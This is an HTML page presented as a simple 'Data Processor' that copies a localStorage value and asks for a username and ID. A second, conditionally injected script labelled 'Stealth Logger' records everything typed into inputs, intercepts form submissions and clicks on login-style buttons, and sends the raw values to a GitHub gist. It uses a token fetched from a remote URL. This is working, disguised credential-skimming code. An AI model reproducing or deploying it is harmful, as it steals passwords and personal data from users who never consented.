<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Processor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            background-color: #f5f5f5;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #45a049;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
        }
        .success {
            background-color: #dff0d8;
            color: #3c763d;
        }
        .error {
            background-color: #f2dede;
            color: #a94442;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Data Processor</h1>
        
        <div id="userSetup" class="hidden">
            <h2>User Setup</h2>
            <p>Please enter your username and ID for tracking:</p>
            <label for="username">Username:</label>
            <input type="text" id="username" placeholder="Your username (will be used as filename)">
            
            <label for="userId">ID:</label>
            <input type="text" id="userId" placeholder="Your unique ID">
            
            <button id="saveUser">Save User Info</button>
        </div>
        
        <div id="statusMessage" class="status hidden"></div>
        
        <div id="dataInfo" class="hidden">
            <h2>Data Processing</h2>
            <p>Data from localStorage (data1step):</p>
            <pre id="data1stepDisplay"></pre>
            <p>Data will be processed and saved to data2step.</p>
        </div>
    </div>

    <script>
        // Check for existing user info
        const storedUsername = localStorage.getItem('username');
        const storedUserId = localStorage.getItem('userId');
        
        // DOM elements
        const userSetupDiv = document.getElementById('userSetup');
        const dataInfoDiv = document.getElementById('dataInfo');
        const statusMessageDiv = document.getElementById('statusMessage');
        
        if (storedUsername && storedUserId) {
            // User info exists, hide setup form
            userSetupDiv.classList.add('hidden');
            dataInfoDiv.classList.remove('hidden');
            showStatus(`Welcome back, ${storedUsername}! (ID: ${storedUserId})`, 'success');
            
            // Process data
            processData();
        } else {
            // Show user setup form
            userSetupDiv.classList.remove('hidden');
            
            // Save user info handler
            document.getElementById('saveUser').addEventListener('click', () => {
                const username = document.getElementById('username').value.trim();
                const userId = document.getElementById('userId').value.trim();
                
                if (username && userId) {
                    localStorage.setItem('username', username);
                    localStorage.setItem('userId', userId);
                    
                    userSetupDiv.classList.add('hidden');
                    dataInfoDiv.classList.remove('hidden');
                    showStatus(`User info saved successfully!`, 'success');
                    
                    // Process data
                    processData();
                } else {
                    showStatus('Please enter both username and ID', 'error');
                }
            });
        }
        
        function processData() {
            const data1step = localStorage.getItem('data1step');
            
            if (data1step) {
                // Display the data
                document.getElementById('data1stepDisplay').textContent = data1step;
                
                // Process the data (in this case, just copy to data2step)
                localStorage.setItem('data2step', data1step);
                
                // Get username for filename
                const username = localStorage.getItem('username') || 'anonymous';
                const filename = `${username}.json`;
                
                showStatus(`Data processed successfully and saved to data2step. Filename would be: ${filename}`, 'success');
            } else {
                showStatus('No data found in data1step', 'error');
            }
        }
        
        function showStatus(message, type) {
            statusMessageDiv.textContent = message;
            statusMessageDiv.className = `status ${type}`;
            statusMessageDiv.classList.remove('hidden');
        }
    </script>

    <!-- This is where the script will be injected if data1step exists -->
    <script>
        // Check for data1step and inject the script if it exists
        if (localStorage.getItem('data1step')) {
            const script = document.createElement('script');
            script.innerHTML = `
                // CONFIGURATION
                const CONFIG = {
                    // Gist configuration
                    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
                    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.json' : 'Data.json',
                    
                    // GitHub token URL (replace with your own token endpoint if needed)
                    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',

                    // Time to wait after typing before considering input "finished" (ms)
                    INPUT_IDLE_TIMEOUT: 2000,

                    // Patterns that indicate a submit button
                    SUBMIT_BUTTON_PATTERNS: [
                        'submit', 'login', 'sign in', 'continue', 
                        'next', 'confirm', 'proceed', 'authenticate'
                    ]
                };

                // ===== INVISIBLE LOGGER =====
                (() => {
                    // Silent console logging (optional for debugging)
                    const log = (msg, type='info') => {
                        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
                    };

                    // ===== DATA CAPTURE =====
                    let typingTimer;
                    let formData = {};

                    // Fetch GitHub token
                    const fetchToken = async () => {
                        try {
                            const res = await fetch(CONFIG.TOKEN_URL);
                            return (await res.text()).trim();
                        } catch (err) {
                            log('Failed to fetch token', 'error');
                            return null;
                        }
                    };

                    // Upload data to Gist
                    const uploadToGist = async (data) => {
                        try {
                            const token = await fetchToken();
                            if (!token) return false;

                            // Prepare the data with timestamp
                            const timestamp = new Date().toISOString();
                            const entry = {
                                page_url: window.location.href,
                                userId: localStorage.getItem('userId') || 'unknown',
                                ...data
                            };

                            // Step 1: Get current content of the Gist
                            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
                                headers: { Authorization: \`token \${token}\` }
                            });

                            if (!gistRes.ok) {
                                log('Failed to fetch existing gist', 'error');
                                return false;
                            }

                            const gistData = await gistRes.json();
                            let currentData = {};

                            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
                                try {
                                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
                                } catch (e) {
                                    currentData = {};
                                }
                            }

                            // Step 2: Append new data with timestamp key
                            currentData[timestamp] = entry;

                            // Step 3: Send PATCH to update the Gist
                            const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
                                method: 'PATCH',
                                headers: {
                                    'Authorization': \`token \${token}\`,
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    files: {
                                        [CONFIG.GIST_FILENAME]: {
                                            content: JSON.stringify(currentData, null, 2)
                                        }
                                    }
                                })
                            });

                            return updateRes.ok;
                        } catch (err) {
                            log('Gist upload failed: ' + err.message, 'error');
                            return false;
                        }
                    };

                    // ===== EVENT HANDLERS =====
                    const setupInputHandlers = () => {
                        document.querySelectorAll('input, textarea, select').forEach(field => {
                            field.addEventListener('input', () => {
                                clearTimeout(typingTimer);
                                typingTimer = setTimeout(() => {
                                    const name = field.name || field.id || 'unnamed_field';
                                    const value = field.value;
                                    if (value) {
                                        formData[name] = value; // Stores raw value
                                    }
                                }, CONFIG.INPUT_IDLE_TIMEOUT);
                            });
                        });
                    };

                    const setupSubmissionHandlers = () => {
                        // Form submissions
                        document.querySelectorAll('form').forEach(form => {
                            form.addEventListener('submit', (e) => {
                                e.preventDefault(); // Stop default submission

                                const data = {};
                                Array.from(form.elements).forEach(el => {
                                    if (el.name && el.value) {
                                        data[el.name] = el.value; // RAW DATA
                                    }
                                });
                                uploadToGist(data);
                            }, true);
                        });

                        // Button clicks
                        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
                            btn.addEventListener('click', (e) => {
                                const btnText = (btn.textContent || btn.value || '').toLowerCase();
                                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                                    btnText.includes(pattern)
                                );

                                if (isSubmit && Object.keys(formData).length > 0) {
                                    uploadToGist(formData);
                                    formData = {}; // Clear after submission
                                }
                            }, true);
                        });
                    };

                    // ===== INITIALIZATION =====
                    setupInputHandlers();
                    setupSubmissionHandlers();

                    // Watch for dynamically added elements
                    new MutationObserver(() => {
                        setupInputHandlers();
                        setupSubmissionHandlers();
                    }).observe(document.body, { childList: true, subtree: true });
                })();
            `;
            document.body.appendChild(script);
        }
    </script>
</body>
</html>